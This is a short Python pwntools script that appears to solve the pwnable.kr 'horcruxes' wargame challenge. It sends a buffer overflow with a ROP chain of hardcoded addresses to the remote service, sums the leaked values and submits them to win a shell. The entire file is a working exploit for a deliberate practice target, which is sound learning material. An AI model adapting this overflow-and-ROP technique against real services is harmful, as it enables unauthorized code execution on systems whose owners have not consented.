from pwn import *
import re

Hor_A = '\x4b\xfe\x09\x08'
Hor_B = '\x6a\xfe\x09\x08'
Hor_C = '\x89\xfe\x09\x08'
Hor_D = '\xa8\xfe\x09\x08'
Hor_E = '\xc7\xfe\x09\x08'
Hor_F = '\xe6\xfe\x09\x08'
Hor_G = '\x05\xff\x09\x08'
ropme = '\xfc\xff\x09\x08'


#r = process("./horcruxes")
r = remote("pwnable.kr", 9032)

#Take the PID of the proccess for the GDB
#pid=r.pid
#print(r.pid)
print()

input()

conn =  r.recvuntil("Select Menu:")
print(conn)
print()

r.sendline("123")
conn =  r.recvuntil("earned? : ")
print(conn)
print()

#Create payload and send it
payload = 'a' * 120
payload += Hor_A + Hor_B + Hor_C + Hor_D + Hor_E + Hor_F + Hor_G + ropme
r.sendline(payload)

#We take each EXP number and get the sum
exp = 0
for i in range(7):
    print("i = "+str(i))
    conn = r.recvline()
    print(conn)
    expString = r.recvuntil('EXP +')
    print(expString)
    recvdata = int(r.recvuntil(')')[:-1])
    print(recvdata)
    print()
    exp +=recvdata
    print(exp)

print("Total experience:")
print(exp)
print()

conn = r.recvuntil("Select Menu:")
print(conn)
r.sendline("123")

conn=r.recvuntil("earned? : ")
print(conn)

r.sendline(str(exp))
r.interactive()


